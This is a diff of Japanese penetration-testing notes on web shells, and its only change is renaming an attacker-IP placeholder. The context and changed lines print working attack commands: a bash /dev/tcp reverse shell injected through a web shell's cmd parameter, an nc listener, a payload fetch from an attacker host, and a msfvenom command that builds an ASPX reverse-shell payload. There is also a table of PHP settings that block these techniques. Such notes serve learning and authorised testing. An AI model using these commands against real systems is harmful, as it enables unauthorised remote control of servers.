@@ -50,7 +50,7 @@ $$WebShell実行例$$
 
 🐧Linux：WebShell上に以下のコマンドをエンコードて実行する
 ```zsh
-<url>?cmd=bash -c 'bash -i >& /dev/tcp/<AttackerIP>/443 0>&1'
+<url>?cmd=bash -c 'bash -i >& /dev/tcp/<attacker_IP>/443 0>&1'
 ```
 - エンコード方法はターゲット環境に応じて異なる
 - 基本はBurp SuiteのHackVertorを使って、"url_encode_not_plus"する
@@ -61,11 +61,11 @@ $$WebShell実行例$$
 Reverse Shell を実行したのに接続が確立しない場合、FWなどにより遮断されていないか、問題の切り分けに使う
 ```zsh
 # Attacker
-sudo tcpdump -nni any host <AttackerIP> and port 4444
+sudo tcpdump -nni any host <attacker_IP> and port 4444
 sudo nc -lvnp 4444
 
 # Target WebShell
-<url>?cmd=bash -c 'bash -i >& /dev/tcp/<AttackerIP>/4444 0>&1'
+<url>?cmd=bash -c 'bash -i >& /dev/tcp/<attacker_IP>/4444 0>&1'
 ```
 - 何も表示されない場合は、コマンドが実行されていないか、FWで遮断
 - SYNパケットのみ届く場合は、ポート番号が誤っている
@@ -185,7 +185,7 @@ http://example/config.php
 | proc_open() が使えない                   | `proc_open()` が無効化                       | Pure PHP Reverse Shell (双方向通信型) が構築できない                      | 代替: bash利用の Reverse Shell (`bash -i >& /dev/tcp/IP/PORT`)          |
 | disable_functions に全てのコマンド実行関数が含まれる | system, exec, shell_exec, passthru等が全て無効 | 全てのコマンド実行手法が使えない                                             | 致命的: WebShell もReverse Shell も構築不可                                |
 | getcwd() が chroot jail 内            | ファイルシステムが制限された環境                         | jail 外のディレクトリにアクセス不可                                         | 探索・操作範囲が大幅に制限される                                                   |
-| allow_url_fopen が Off               | リモートファイル読込が無効                            | `file_get_contents('http://<AttackerIP>/payload.txt')` が使えない | ペイロードのダウンロードができない。代替: curlコマンド、wgetコマンド                            |
+| allow_url_fopen が Off               | リモートファイル読込が無効                            | `file_get_contents('http://<attacker_IP>/payload.txt')` が使えない | ペイロードのダウンロードができない。代替: curlコマンド、wgetコマンド                            |
 | allow_url_include が Off             | リモートファイル実行が無効                            | `include($_GET['url'])` 型の攻撃が不可                              | LFI/RFI が制限される（ただし通常は Off が推奨）                                     |
 | open_basedir が設定されている               | アクセス可能ディレクトリが制限                          | 設定されたパス外のファイルにアクセス不可                                         | `/var/www/html` 外を探索できない等の制限                                       |
 | safe_mode が On                      | (PHP<5.4) 安全モードが有効                       | 多くの関数・コマンドが制限される                                             | 古い環境でのみ影響。代替手法を探す必要                                                |
@@ -438,7 +438,7 @@ http://target/shell.aspx
 - 関連ノート：[[☠️Msfvenom]]
 
 ```sh
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=<AttackerIP> LPORT=<Port> -f aspx -o reverse.aspx
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_IP> LPORT=<Port> -f aspx -o reverse.aspx
 ```
 
 ### Identify Target
